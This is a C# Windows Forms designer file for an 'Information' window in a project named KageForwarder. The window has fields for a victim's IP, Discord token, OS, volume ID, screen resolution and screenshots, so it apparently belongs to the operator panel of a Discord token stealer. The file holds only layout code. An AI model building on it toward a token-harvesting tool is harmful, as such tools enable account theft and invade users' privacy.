namespace KageForwarder
{
    partial class Information
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Information));
            this.bunifuElipse1 = new Bunifu.Framework.UI.BunifuElipse(this.components);
            this.DragPanel = new Bunifu.UI.WinForms.BunifuPanel();
            this.label3 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label1 = new System.Windows.Forms.Label();
            this.username = new System.Windows.Forms.Label();
            this.label9 = new System.Windows.Forms.Label();
            this.computername = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.lastworldl = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.resLabel = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.ipLabel = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.bunifuDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.screenshots = new System.Windows.Forms.Label();
            this.Screenshottext = new System.Windows.Forms.TextBox();
            this.DragPanel.SuspendLayout();
            this.SuspendLayout();
            // 
            // bunifuElipse1
            // 
            this.bunifuElipse1.ElipseRadius = 5;
            this.bunifuElipse1.TargetControl = this;
            // 
            // DragPanel
            // 
            this.DragPanel.BackgroundColor = System.Drawing.Color.DodgerBlue;
            this.DragPanel.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("DragPanel.BackgroundImage")));
            this.DragPanel.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.DragPanel.BorderColor = System.Drawing.Color.Transparent;
            this.DragPanel.BorderRadius = 3;
            this.DragPanel.BorderThickness = 1;
            this.DragPanel.Controls.Add(this.label3);
            this.DragPanel.Controls.Add(this.label2);
            this.DragPanel.Controls.Add(this.label1);
            this.DragPanel.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DragPanel.ForeColor = System.Drawing.Color.White;
            this.DragPanel.Location = new System.Drawing.Point(-11, -4);
            this.DragPanel.Name = "DragPanel";
            this.DragPanel.ShowBorders = true;
            this.DragPanel.Size = new System.Drawing.Size(647, 39);
            this.DragPanel.TabIndex = 1;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 13F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(14, 10);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(98, 22);
            this.label3.TabIndex = 2;
            this.label3.Text = "Information";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.Color.Transparent;
            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 13F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.Location = new System.Drawing.Point(584, 10);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(16, 22);
            this.label2.TabIndex = 1;
            this.label2.Text = "-";
            this.label2.Click += new System.EventHandler(this.label2_Click);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 13F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.Location = new System.Drawing.Point(610, 10);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(22, 22);
            this.label1.TabIndex = 0;
            this.label1.Text = "X";
            this.label1.Click += new System.EventHandler(this.label1_Click);
            // 
            // username
            // 
            this.username.AutoSize = true;
            this.username.Font = new System.Drawing.Font("Segoe UI Semilight", 15F);
            this.username.ForeColor = System.Drawing.Color.White;
            this.username.Location = new System.Drawing.Point(369, 158);
            this.username.Name = "username";
            this.username.Size = new System.Drawing.Size(16, 28);
            this.username.TabIndex = 28;
            this.username.Text = ".";
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Font = new System.Drawing.Font("Segoe UI Semilight", 15F);
            this.label9.ForeColor = System.Drawing.Color.White;
            this.label9.Location = new System.Drawing.Point(324, 158);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(41, 28);
            this.label9.TabIndex = 27;
            this.label9.Text = "OS:";
            // 
            // computername
            // 
            this.computername.AutoSize = true;
            this.computername.Font = new System.Drawing.Font("Segoe UI Semilight", 15F);
            this.computername.ForeColor = System.Drawing.Color.White;
            this.computername.Location = new System.Drawing.Point(119, 192);
            this.computername.Name = "computername";
            this.computername.Size = new System.Drawing.Size(16, 28);
            this.computername.TabIndex = 26;
            this.computername.Text = ".";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Segoe UI Semilight", 15F);
            this.label5.ForeColor = System.Drawing.Color.White;
            this.label5.Location = new System.Drawing.Point(14, 192);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(99, 28);
            this.label5.TabIndex = 25;
            this.label5.Text = "VolumeID:";
            // 
            // lastworldl
            // 
            this.lastworldl.AutoSize = true;
            this.lastworldl.Cursor = System.Windows.Forms.Cursors.Hand;
            this.lastworldl.Font = new System.Drawing.Font("Segoe UI Semilight", 15F);
            this.lastworldl.ForeColor = System.Drawing.Color.DodgerBlue;
            this.lastworldl.Location = new System.Drawing.Point(152, 158);
            this.lastworldl.Name = "lastworldl";
            this.lastworldl.Size = new System.Drawing.Size(117, 28);
            this.lastworldl.TabIndex = 24;
            this.lastworldl.Text = "Click to copy";
            this.lastworldl.Click += new System.EventHandler(this.lastworldl_Click);
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Font = new System.Drawing.Font("Segoe UI Semilight", 15F);
            this.label7.ForeColor = System.Drawing.Color.White;
            this.label7.Location = new System.Drawing.Point(14, 158);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(132, 28);
            this.label7.TabIndex = 23;
            this.label7.Text = "Discord token:";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Segoe UI Semilight", 15F);
            this.label6.ForeColor = System.Drawing.Color.White;
            this.label6.Location = new System.Drawing.Point(324, 123);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(161, 28);
            this.label6.TabIndex = 21;
            this.label6.Text = "Screen resolution:";
            // 
            // resLabel
            // 
            this.resLabel.AutoSize = true;
            this.resLabel.Font = new System.Drawing.Font("Segoe UI Semilight", 15F);
            this.resLabel.ForeColor = System.Drawing.Color.White;
            this.resLabel.Location = new System.Drawing.Point(491, 123);
            this.resLabel.Name = "resLabel";
            this.resLabel.Size = new System.Drawing.Size(16, 28);
            this.resLabel.TabIndex = 20;
            this.resLabel.Text = ".";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Segoe UI Semilight", 15F);
            this.label4.ForeColor = System.Drawing.Color.White;
            this.label4.Location = new System.Drawing.Point(324, 192);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(64, 28);
            this.label4.TabIndex = 19;
            this.label4.Text = "64 bit:";
            // 
            // ipLabel
            // 
            this.ipLabel.AutoSize = true;
            this.ipLabel.Font = new System.Drawing.Font("Segoe UI Semilight", 15F);
            this.ipLabel.ForeColor = System.Drawing.Color.White;
            this.ipLabel.Location = new System.Drawing.Point(52, 123);
            this.ipLabel.Name = "ipLabel";
            this.ipLabel.Size = new System.Drawing.Size(16, 28);
            this.ipLabel.TabIndex = 18;
            this.ipLabel.Text = ".";
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Font = new System.Drawing.Font("Segoe UI Semilight", 15F);
            this.label8.ForeColor = System.Drawing.Color.White;
            this.label8.Location = new System.Drawing.Point(14, 123);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(32, 28);
            this.label8.TabIndex = 17;
            this.label8.Text = "IP:";
            // 
            // bunifuDragControl1
            // 
            this.bunifuDragControl1.Fixed = true;
            this.bunifuDragControl1.Horizontal = true;
            this.bunifuDragControl1.TargetControl = this.DragPanel;
            this.bunifuDragControl1.Vertical = true;
            // 
            // textBox1
            // 
            this.textBox1.Location = new System.Drawing.Point(451, 280);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(100, 20);
            this.textBox1.TabIndex = 29;
            this.textBox1.Visible = false;
            // 
            // screenshots
            // 
            this.screenshots.AutoSize = true;
            this.screenshots.Cursor = System.Windows.Forms.Cursors.Hand;
            this.screenshots.Font = new System.Drawing.Font("Segoe UI Semilight", 15F);
            this.screenshots.ForeColor = System.Drawing.Color.White;
            this.screenshots.Location = new System.Drawing.Point(394, 192);
            this.screenshots.Name = "screenshots";
            this.screenshots.Size = new System.Drawing.Size(16, 28);
            this.screenshots.TabIndex = 30;
            this.screenshots.Text = ".";
            this.screenshots.Click += new System.EventHandler(this.screenshots_Click);
            // 
            // Screenshottext
            // 
            this.Screenshottext.Location = new System.Drawing.Point(250, 260);
            this.Screenshottext.Name = "Screenshottext";
            this.Screenshottext.Size = new System.Drawing.Size(135, 20);
            this.Screenshottext.TabIndex = 31;
            this.Screenshottext.Visible = false;
            // 
            // Information
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(32)))), ((int)(((byte)(41)))), ((int)(((byte)(50)))));
            this.ClientSize = new System.Drawing.Size(628, 333);
            this.Controls.Add(this.Screenshottext);
            this.Controls.Add(this.screenshots);
            this.Controls.Add(this.textBox1);
            this.Controls.Add(this.username);
            this.Controls.Add(this.label9);
            this.Controls.Add(this.computername);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.lastworldl);
            this.Controls.Add(this.label7);
            this.Controls.Add(this.label6);
            this.Controls.Add(this.resLabel);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.ipLabel);
            this.Controls.Add(this.label8);
            this.Controls.Add(this.DragPanel);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "Information";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Information";
            this.DragPanel.ResumeLayout(false);
            this.DragPanel.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private Bunifu.Framework.UI.BunifuElipse bunifuElipse1;
        private Bunifu.UI.WinForms.BunifuPanel DragPanel;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label username;
        private System.Windows.Forms.Label label9;
        private System.Windows.Forms.Label computername;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.Label lastworldl;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.Label resLabel;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.Label ipLabel;
        private System.Windows.Forms.Label label8;
        private Bunifu.Framework.UI.BunifuDragControl bunifuDragControl1;
        private System.Windows.Forms.TextBox textBox1;
        private System.Windows.Forms.Label screenshots;
        private System.Windows.Forms.TextBox Screenshottext;
    }
}